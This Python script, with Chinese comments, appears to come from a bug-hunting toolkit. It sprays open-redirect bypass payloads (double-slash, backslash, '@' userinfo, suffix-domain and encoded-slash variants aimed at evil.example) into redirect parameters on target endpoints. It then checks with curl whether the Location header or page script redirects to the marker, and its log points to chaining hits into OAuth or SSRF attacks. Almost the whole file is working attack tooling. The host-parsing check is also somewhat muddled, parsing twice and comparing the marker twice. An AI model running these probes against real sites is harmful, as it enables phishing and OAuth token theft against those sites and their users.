# -*- coding: utf-8 -*-
"""hunt-open-redirect hunt 阶段：对跳转参数发绕过变体，看 Location/前端跳转是否指向 marker 域。

判活靠**最终跳转主机是 marker**（不是字符串包含），用不跟随重定向抓 Location 头 +
兜底看响应体里的 meta/JS 跳转。只跳自控 marker 域证明。

用法:
  python hunt_openredirect.py --input recon/endpoints.json --output candidates.json --marker evil.example [--dry-run]
"""
import argparse
import os
import re
import subprocess
import sys
from urllib.parse import quote, urlparse

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from common import log, load_json, save_json  # noqa: E402


def variants(marker, target_host):
    t = target_host or "target.com"
    return [
        ("scheme", "https://%s" % marker),
        ("slashless", "https:/%s" % marker),
        ("double-slash", "//%s" % marker),
        ("backslash", "/\\%s" % marker),
        ("at-userinfo", "https://%s@%s" % (t, marker)),
        ("suffix", "https://%s.%s" % (t, marker)),
        ("hash", "https://%s#%s" % (marker, t)),
        ("enc-slash", "%%2f%%2f%s" % marker),
        ("enc-backslash", "%%5c%%5c%s" % marker),
    ]


def build(ep, value):
    base, param = ep.get("url"), ep.get("param")
    if not param or str(param).startswith("<"):
        return None
    sep = "&" if "?" in base else "?"
    return "%s%s%s=%s" % (base, sep, param, quote(value, safe=""))


def get_headers_body(url, max_time=8):
    try:
        p = subprocess.run(["curl", "-sS", "-i", "--max-time", str(max_time), url],
                           capture_output=True, text=True, timeout=max_time + 3)
        return (p.stdout or "") + (p.stderr or "")
    except Exception as e:
        return "ERR:%s" % e


def redirects_to_marker(resp, marker):
    # Location 头最终主机
    m = re.search(r'(?im)^location:\s*([^\r\n]+)$', resp)
    if m:
        loc = m.group(1).strip()
        host = urlparse(loc if "://" in loc else "http://x" + loc if loc.startswith("//") else loc).hostname or ""
        try:
            host = urlparse(loc if "://" in loc else ("http:" + loc if loc.startswith("//") else "http://" + loc)).hostname or ""
        except ValueError:
            host = ""
        if host and (host == marker or host.endswith("." + marker) or host == marker):
            return True, "Location->%s" % loc[:80]
    # 前端跳转
    if re.search(r'(window\.location|location\.href|meta[^>]+refresh)[^>]*%s' % re.escape(marker), resp, re.I):
        return True, "前端跳转指向 marker"
    return False, None


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--input", required=True)
    ap.add_argument("--output", required=True)
    ap.add_argument("--marker", required=True, help="你自控的标记域，如 evil.example")
    ap.add_argument("--dry-run", action="store_true")
    args = ap.parse_args()

    data = load_json(args.input)
    if not data:
        sys.exit("读不到 %s，先跑 recon.sh" % args.input)
    thost = urlparse(data.get("target") or "").hostname
    eps = [e for e in data.get("endpoints", []) if e.get("controllable")]
    cands = []
    for ep in eps:
        for name, val in variants(args.marker, thost):
            url = build(ep, val)
            if not url:
                continue
            if args.dry_run:
                print("[dry-run] %s | %s | %s" % (ep.get("param"), name, url)); continue
            resp = get_headers_body(url)
            hit, how = redirects_to_marker(resp, args.marker)
            cands.append({"endpoint": ep.get("url"), "param": ep.get("param"),
                          "variant": name, "payload": val, "probe_url": url,
                          "signal": ([how] if hit else ["未跳向 marker"]),
                          "suspected": hit})
    if args.dry_run:
        return
    save_json(args.output, {"target": data.get("target"), "marker": args.marker, "candidates": cands})
    hit = sum(1 for c in cands if c["suspected"])
    log("开放重定向候选 %d（%d 跳向 marker）-> %s（升级链 OAuth/SSRF 按 reference 评估）"
        % (len(cands), hit, args.output))


if __name__ == "__main__":
    main()
